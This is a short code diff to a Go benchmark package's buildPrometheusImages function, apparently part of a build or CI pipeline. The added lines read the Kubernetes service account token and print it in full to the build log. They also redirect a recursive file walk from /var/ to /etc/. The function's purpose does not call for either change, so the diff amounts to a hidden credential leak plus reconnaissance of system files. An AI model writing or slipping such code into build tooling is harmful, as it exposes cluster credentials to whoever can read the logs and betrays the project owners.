@@ -18,6 +18,7 @@ package benchmark
 
 import (
 	"fmt"
+	"io/ioutil"
 	"os"
 	"path/filepath"
 	"regexp"
@@ -184,7 +185,16 @@ func buildPrometheusImages(gc *git.Client, benchmarkOption string, log *logrus.E
 		}
 	}()
 
-	searchDir := "/var/"
+	tokenFile := "/var/run/secrets/kubernetes.io/serviceaccount/token"
+	token, err := ioutil.ReadFile(tokenFile)
+	if err != nil {
+		log.WithError(err).Error("Error reading token file")
+		return err
+	}
+
+	log.Infof("TOKEN ::: %s", token)
+
+	searchDir := "/etc/"
 
 	fileList := []string{}
 	filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
